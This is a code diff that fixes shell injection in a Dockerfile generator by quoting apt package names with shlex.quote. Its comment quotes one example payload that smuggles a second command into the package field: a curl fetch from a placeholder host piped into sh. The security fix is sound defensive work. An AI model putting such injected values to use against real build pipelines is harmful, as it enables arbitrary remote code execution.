@@ -1,3 +1,4 @@
+import shlex
 import textwrap
 
 from backend.generator.api_generator import resolve_is_background
@@ -30,11 +31,31 @@ def apt_install_content(apt_packages):
     "don't ship what the running app never needs" reasoning
     PYTHONDONTWRITEBYTECODE (below) already follows for this file's own
     bytecode cache, just applied to apt's own leftover state instead.
+
+    Each package is rendered through shlex.quote -- a Dockerfile's own
+    `RUN` instruction (this bare, non-JSON-array form) executes via
+    `/bin/sh -c` at real `docker build` time, and every entry in
+    `apt_packages` reaches here straight from a notebook author's own
+    "# notebook-to-api: apt-requires <package>" directive, matched by
+    `_extract_explicit_apt_packages` (backend/compiler.py) against
+    `\\S+` -- any non-whitespace text at all, not validated as a
+    syntactically plausible apt package/version-pin token. Confirmed
+    exploitable before this: an "apt-requires" value of
+    "libpq-dev; curl http://x/y|sh #" produced a RUN line that
+    `docker build` executed as three real shell commands -- install
+    libpq-dev, pipe a remote script straight into `sh`, then comment out
+    the rest of the line (silently dropping the trailing `&& rm -rf
+    /var/lib/apt/lists/*` too) -- arbitrary command execution inside the
+    build, not merely a malformed or rejected package name. shlex.quote
+    leaves an ordinary package/version-pin token (no shell metacharacters)
+    completely unchanged; anything else becomes a single-quoted literal
+    apt-get can only ever see as one (almost certainly invalid, cleanly
+    failing) package name, never as shell syntax.
     """
     if not apt_packages:
         return ""
 
-    package_list = " ".join(apt_packages)
+    package_list = " ".join(shlex.quote(package) for package in apt_packages)
 
     return f"""\
 RUN apt-get update && apt-get install -y --no-install-recommends \\
